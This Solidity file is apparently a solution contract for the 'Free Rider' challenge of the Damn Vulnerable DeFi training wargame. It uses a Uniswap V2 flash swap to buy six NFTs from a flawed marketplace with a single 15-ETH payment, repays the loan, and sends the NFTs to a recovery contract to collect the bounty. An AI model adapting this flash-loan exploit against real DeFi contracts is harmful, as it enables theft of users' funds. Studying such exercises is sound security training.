// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
import {IUniswapV2Pair } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attack {

    FreeRiderRecoveryManager public immutable recoveryContract;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable pair;
    IWETH public immutable weth;
    address immutable me;

    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address payable _marketplace, address _weth, address _nft, address _recovery, address _me){
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        weth = IWETH(_weth);
        recoveryContract = FreeRiderRecoveryManager(_recovery);
        me = _me;
    }

    receive() external payable {}

    function attack() external payable {
        pair.swap(15e18, 0, address(this), '0x0');
    }


    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        weth.withdraw(15e18);
        marketplace.buyMany{value: 15e18}(tokenIds);
        weth.deposit{value: 15e18 + 0.05 ether}();
        weth.transfer(address(pair), 15e18 + 0.05 ether);
        for(uint256 i; i < 6; i++){
            nft.safeTransferFrom(address(this), address(recoveryContract), i, abi.encode(me));
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}

